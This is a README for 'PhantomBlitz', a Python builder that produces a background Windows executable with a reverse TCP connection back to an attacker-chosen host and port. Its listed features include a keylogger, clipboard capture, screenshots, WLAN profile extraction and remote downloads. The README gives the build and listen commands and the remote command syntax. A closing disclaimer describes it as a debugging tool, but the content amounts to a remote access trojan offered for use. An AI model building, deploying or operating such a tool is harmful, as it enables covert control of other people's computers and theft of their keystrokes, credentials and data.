 # PhantomBlitz
![image](https://user-images.githubusercontent.com/111997815/235445673-e72f087d-ce6f-4737-a1eb-f36e1fcf4aad.png)

**PhantomBlitz is a Python-based framework that creates an executable file with various parameters. It allows users to perform a reverse TCP connection and execute cmd commands.**
> **IMPORTANT**:```⚠ DETECTABLE BY AV AND WINDOWS```
![VIRUS-TOTAL-SCREENSHOT](https://github.com/devsdenepal/PhantomBlitz/blob/main/341264188_211432421592581_4782327762530171716_n.png?raw=true)
## Features

- [x] Reverse TCP connection
- [x] Execute cmd commands
- [x] Collect OS info
- [x] Set clipboard text
- [x] Get clipboard text
- [x] Take screenshot
- [x] Start file server
- [x] Analyze LAN traffic
- [x] Type text
- [x] Download URL
- [x] Open link
- [x] Generate WLAN profile
- [x] Keylogger
## Requirements
> Same platform as the client
## Usage

PhantomBlazer can be executed with the following parameters:
``` 
    --mode/-m: Mode: accepts > build or listen
    --lhost/-lh: The local host IP address
    --lport/-lp: The local port number
    --output/-o: The output file name
```
> Example: ``` python3 phantomblazer.py -m build --lh <ip.address> --lp <port> --output<application.name>.exe```
> Before payload execution on client: ``` python3 phantomblazer.py -m listen --lh <ip.address> -lp <port> ```

### Inbuilt ommands can be executed using the following syntax:
```
    collect-os-info
    set clipboard <text>
    get clipboard
    take screenshot
    start file server
    analyze lan traffic
    type <text>
    download <url>
    open link <link>
    generate wlan profile *
    generate wlan profile <name>
    start keylogging
```
> To view captured use ```start file server``` for remote file service , the server will be on the client's address
## DISCLAIMER:
This tool is intended for legal and ethical use only. The creator of this tool is not responsible for any illegal or unethical use of this tool.

The tool creates a .exe file which runs as a background and creates a reverse TCP connection, allowing for remote command execution. This tool is intended for debugging purposes and should not be used to gain unauthorized access to systems.

Please use this tool at your own risk and with the appropriate permissions from the system owners. Any actions taken with this tool are the sole responsibility of the user.

By using this tool, you agree to the <a href = "https://github.com/devsdenepal/PhantomBlitz/blob/main/terms-and-conditions.md">```terms and conditions```</a> outlined above and acknowledge that any misuse of this tool is strictly prohibited.
